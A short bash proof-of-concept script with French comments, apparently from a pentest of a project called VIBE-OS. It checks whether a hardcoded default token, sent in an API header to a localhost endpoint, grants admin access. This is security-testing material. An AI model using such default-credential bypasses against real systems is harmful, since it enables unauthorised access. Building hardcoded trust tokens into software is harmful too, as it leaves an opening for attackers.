#!/bin/bash
# PoC - Default Sentinel Token Authentication Bypass
# VIBE-OS Pentest Mode D

API_URL="http://localhost:3000/api/system/stats"
DEFAULT_TOKEN="vibe-sentinel-trust-99"

echo "--- [PoC] Tentative d'accès Admin avec le token par défaut ---"

# Note: L'API vérifie si l'IP est interne. Dans cet environnement local, 
# localhost/127.0.0.1 est considéré comme interne par auth.js.

RESPONSE=$(curl -s -X GET "$API_URL" \
     -H "x-api-token: $DEFAULT_TOKEN")

echo "Réponse du serveur: $(echo "$RESPONSE" | head -c 100)..."

if [[ "$RESPONSE" == *"cpu"* || "$RESPONSE" == *"memory"* ]]; then
    echo -e "\n[🚨 CRITIQUE] Accès ADMIN accordé via le token PAR DÉFAUT."
else
    echo -e "\n[✅ SECURE] L'accès a été refusé."
fi
